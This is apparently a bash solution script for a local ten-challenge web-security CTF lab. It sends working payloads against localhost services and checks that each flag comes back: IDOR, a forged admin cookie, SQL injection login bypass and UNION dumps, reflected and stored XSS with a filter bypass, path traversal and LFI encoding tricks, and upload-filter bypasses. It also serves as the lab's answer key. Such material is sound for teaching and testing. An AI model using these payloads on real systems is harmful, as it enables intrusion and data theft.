#!/usr/bin/env bash
# solve_all.sh — exploit all 10 challenges, assert each flag comes back, submit it,
# and check the scoreboard reaches 1750/1750.
# Usage:  ./solve_all.sh            (starts the CTF itself if it isn't already running)
#         RESET=1 ./solve_all.sh    (wipe scoreboard.db first)
set -u
cd "$(dirname "$0")"
H=http://127.0.0.1
TMP=$(mktemp -d); STARTED=""
cleanup() { [ -n "$STARTED" ] && kill "$STARTED" 2>/dev/null; pkill -f "$PWD/challenges/.*/app.py" 2>/dev/null; pkill -f "$PWD/index.py" 2>/dev/null; rm -rf "$TMP"; }

if [ "${RESET:-0}" = 1 ]; then rm -f scoreboard.db; fi
if ! curl -s -o /dev/null "$H:8000/"; then
  python3 run_all.py >"$TMP/run.log" 2>&1 & STARTED=$!
  trap cleanup EXIT
  for _ in $(seq 50); do curl -s -o /dev/null "$H:8010/" && break; sleep 0.2; done
fi

PASS=0; FAIL=0
check() {  # check <num> <port> <expected-flag> <response-text>
  local n=$1 port=$2 flag=$3 out=$4
  if grep -qF "$flag" <<<"$out"; then
    curl -s -o /dev/null --data-urlencode "flag=$flag" "$H:$port/submit"
    printf '  [PASS] %-3s :%s  %s\n' "$n" "$port" "$flag"; PASS=$((PASS+1))
  else
    printf '  [FAIL] %-3s :%s  flag not returned\n' "$n" "$port"; FAIL=$((FAIL+1))
  fi
}

echo "== Exploiting challenges =="

# 1 — IDOR easy: log in as 101, read id=102
J="$TMP/c1"; curl -s -c "$J" -o /dev/null -d 'userid=101&password=password101' "$H:8001/login"
check 1 8001 'FLAG{idor_h0rizontal_pr1v_esc}' "$(curl -s -b "$J" "$H:8001/account?id=102")"

# 2 — Broken access hard: robots.txt -> /admin, forge role=admin cookie
curl -s "$H:8002/robots.txt" | grep -q '/admin' || echo "  (robots.txt missing /admin)"
J="$TMP/c2"; curl -s -c "$J" -o /dev/null -d 'username=guest&password=guest' "$H:8002/login"
SESS=$(awk '$6=="ba_session"{print $7}' "$J")
check 2 8002 'FLAG{broken_access_vertical_esc}' "$(curl -s -H "Cookie: ba_session=$SESS; role=admin" "$H:8002/admin")"

# 3 — SQLi login bypass
check 3 8003 'FLAG{sql1_auth_bypass_comment}' \
  "$(curl -s --data-urlencode "username=admin' --" --data-urlencode 'password=x' "$H:8003/login")"

# 4 — SQLi UNION: ORDER BY 3 errors (2 columns), then UNION from secrets
curl -s -G --data-urlencode "q=' ORDER BY 3 --" "$H:8004/" | grep -q 'SQL error' || echo "  (ORDER BY 3 did not error)"
check 4 8004 'FLAG{un1on_based_data_dump}' \
  "$(curl -s -G --data-urlencode "q=' UNION SELECT flag, NULL FROM secrets --" "$H:8004/")"

# 5 — Reflected XSS: payload is reflected raw, then solve() posts location.search
P='<script>solve()</script>'
curl -s -G --data-urlencode "q=$P" "$H:8005/" | grep -qF "$P" || echo "  (payload not reflected raw)"
check 5 8005 'FLAG{r3flected_xss_proven}' \
  "$(curl -s --data-binary "?q=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")" "$H:8005/api/solve")"

# 6 — Stored XSS + 'script' blacklist bypass via event handler, admin bot, collector
curl -s -o /dev/null --data-urlencode 'name=x' --data-urlencode 'comment=<script>steal()</script>' "$H:8006/comment"
curl -s -o /dev/null --data-urlencode 'name=x' --data-urlencode 'comment=<img src=x onerror=steal()>' "$H:8006/comment"
curl -s -o /dev/null "$H:8006/admin/visit"
check 6 8006 'FLAG{st0red_xss_filter_bypass}' "$(curl -s "$H:8006/collector")"

# 7 — Path traversal
check 7 8007 'FLAG{path_traversal_dotdot}' "$(curl -s --path-as-is "$H:8007/download?file=../../secret/flag.txt")"

# 8 — LFI filter bypass: plain ../ is stripped; nested ....// and ..%2f both work
curl -s --path-as-is "$H:8008/download?file=../../secret/flag.txt" | grep -q 'FLAG{lfi' && echo "  (filter not applied!)"
curl -s "$H:8008/download?file=..%2f..%2fsecret%2fflag.txt" | grep -q 'FLAG{lfi' || echo "  (..%2f variant failed)"
check 8 8008 'FLAG{lfi_encoded_traversal_bypass}' "$(curl -s "$H:8008/download?file=....//....//secret/flag.txt")"

# 9 — Unrestricted upload: .html calling solve() rendered from /uploads/
printf '<script src="/static/ctf.js"></script><script>solve()</script>' >"$TMP/pwn.html"
curl -s -o /dev/null -F "file=@$TMP/pwn.html" "$H:8009/upload"
curl -sI "$H:8009/uploads/pwn.html" | grep -qi 'content-type: text/html' || echo "  (upload not served as html)"
check 9 8009 'FLAG{unrestricted_upload_served}' "$(curl -s -H "Referer: $H:8009/uploads/pwn.html" "$H:8009/api/solve")"

# 10 — Upload bypass: .html blocked; x.HtMl + spoofed image/png passes and renders as HTML
curl -s -o /dev/null -D - -F "file=@$TMP/pwn.html;type=text/html" "$H:8010/upload" | grep -q 'Blocked' || echo "  (.html not blocked)"
curl -s -o /dev/null -F "file=@$TMP/pwn.html;filename=pwn.html.png;type=image/png" "$H:8010/upload"
curl -sI "$H:8010/uploads/pwn.html.png" | grep -qi 'content-type: text/html' || echo "  (double-ext variant failed)"
curl -s -o /dev/null -F "file=@$TMP/pwn.html;filename=pwn.HtMl;type=image/png" "$H:8010/upload"
check 10 8010 'FLAG{upload_filter_bypass_exec}' "$(curl -s -H "Referer: $H:8010/uploads/pwn.HtMl" "$H:8010/api/solve")"

echo
SCORE=$(curl -s "$H:8000/" | grep -o '[0-9]* / 1750' | head -1)
echo "== $PASS passed, $FAIL failed — scoreboard: $SCORE =="
[ "$FAIL" = 0 ] && [ "$SCORE" = "1750 / 1750" ]
